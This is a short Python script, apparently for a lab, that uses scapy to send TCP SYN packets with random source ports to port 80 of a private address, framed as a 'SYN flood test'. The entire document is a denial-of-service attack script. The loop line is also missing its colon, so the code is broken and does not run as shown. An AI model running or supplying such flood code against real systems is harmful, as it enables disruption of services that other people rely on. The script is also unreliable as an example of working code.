from scapy.all import IP, TCP, send
import time
import random


target_ip = "10.0.2.15"

print(f"Starting SYN flood test against {target_ip}...")

try:
    for i in range(100)
        packet = IP(dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=80, flags='S')
        send(packet, verbose=False)
        print(f"Packet {i+1} sent...")
        time.sleep(0.1)
except KeyboardInterrupt:
    print("\nAttack stopped.")

print("Test finished.")
